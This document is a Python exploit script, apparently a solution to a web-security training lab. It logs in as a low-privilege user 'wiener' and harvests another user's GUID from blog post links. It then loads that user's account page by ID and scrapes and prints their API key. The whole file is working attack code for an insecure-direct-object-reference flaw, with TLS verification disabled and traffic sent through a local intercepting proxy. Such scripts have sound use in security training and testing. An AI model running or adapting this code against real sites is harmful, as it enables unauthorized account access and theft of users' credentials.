import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def carlos_guid(s, url):
    #Load the home page
    r= requests.get(url, verify=False, proxies=proxies)
    res= r.text
    post_ids = re.findall(r'postId=(\w+)"', res)
    unique_post_ids = list(set(post_ids))
    print(unique_post_ids)

    #Loop through all the posts to find the one Carlos wrote
    for i in unique_post_ids:
        r=s.get(url + "/post?postId=" + i, verify=False, proxies=proxies)
        res=r.text
        if 'carlos' in res:
            print("Carlos GUID found..")
            guid = re.findall(r"userId=(.*)'", res)[0]
            return guid




def carlos_api_key(s, url):
    #Get CSRF token from the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #Login in as wiener user 
    print("Logging in as Wiener User")
    data_login = {"csrf": csrf_token, "username":"wiener", "password":"peter"}

    r= s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res=r.text

    if "Log out" in res:
        print("You have logged in successfully")

        #Obtain Carlos's GUID
        guid = carlos_guid(s, url)

        #Obtain Carlos's API key
        carlos_account_url = url + "/my-account?id=" + guid
        r= s.get(carlos_account_url, verify=False, proxies=proxies)
        res=r.text
        if 'carlos' in res:
            print("Successfully accessed carlos account...")
            print("Retrieving API key...")
            api_key = re.findall(r'Your API Key is:(.*)\<\/div>', res)
            print('API key is: ' + api_key[0])
        else:
            print("Unable to access Carlos account")
            sys.exit(-1)
    else:
        print("Could not login as wiener user.")
        sys.exit(-1)


     

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <url>" %sys.argv[0])
        print("Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    carlos_api_key(s, url)

if __name__ == "__main__":
    main()